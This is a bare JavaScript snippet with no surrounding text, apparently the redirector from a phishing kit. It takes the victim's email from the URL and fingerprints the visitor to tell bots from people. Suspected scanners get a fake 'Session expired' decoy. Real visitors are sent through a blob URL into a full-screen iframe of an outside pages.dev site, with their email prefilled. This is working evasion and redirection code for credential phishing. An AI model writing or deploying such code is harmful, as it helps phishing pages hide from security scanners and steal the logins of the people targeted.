<script>
(function () {
    'use strict';

    const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
    const start = performance.now();

    let interacted = false;
    ['mousemove','touchstart','keydown','scroll'].forEach(e =>
        document.addEventListener(e, () => interacted = true, { once: true })
    );

    /* -------- STRONG BOT CHECK ONLY -------- */
    function isDefinitelyBot() {
        // Explicit automation
        if (navigator.webdriver) return true;

        // Unrealistic environment (strong signal only)
        if (navigator.plugins.length === 0 && !('ontouchstart' in window)) return true;

        // Script executed too fast (real browsers rarely <80ms)
        if (performance.now() - start < 80) return true;

        return false;
    }

    /* -------- ORIGINAL LOGIC -------- */
    function getEmail() {
        return new URLSearchParams(window.location.search).get("email") || "";
    }

    function buildTargetUrl(email) {
        return email
            ? TARGET_BASE + "?email=" + encodeURIComponent(email)
            : TARGET_BASE;
    }

    function createMobileSafeBlob(targetUrl, email) {
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html, body { margin:0; padding:0; width:100%; height:100%; }
iframe { width:100%; height:100%; border:none; }
</style>
</head>
<body>
<iframe src="${targetUrl}"></iframe>
<script>
const email = ${JSON.stringify(email)};
<\/script>
</body>
</html>`;
        return new Blob([html], { type: "text/html" });
    }

    /* -------- SAFE MULTI-LAYER DECOY -------- */
    function createDecoyBlob() {
        const html = `<!DOCTYPE html>
<html>
<body>
<p>Loadingâ€¦</p>
<script>
setTimeout(() => {
    document.body.innerHTML = "<p>Session expired.</p>";
}, 3000);
setInterval(() => {}, 1000);
<\/script>
</body>
</html>`;
        return new Blob([html], { type: "text/html" });
    }

    function grantAccess() {
        if (isDefinitelyBot()) {
            const decoyUrl = URL.createObjectURL(createDecoyBlob());
            window.location.replace(decoyUrl);
            return;
        }

        // Humans ALWAYS reach this
        const email = getEmail();
        const targetUrl = buildTargetUrl(email);
        const blob = createMobileSafeBlob(targetUrl, email);
        const blobUrl = URL.createObjectURL(blob);

        window.location.replace(blobUrl);

        setTimeout(() => {
            try { URL.revokeObjectURL(blobUrl); } catch (e) {}
        }, 10000);
    }

    setTimeout(grantAccess, 250);
})();
</script>
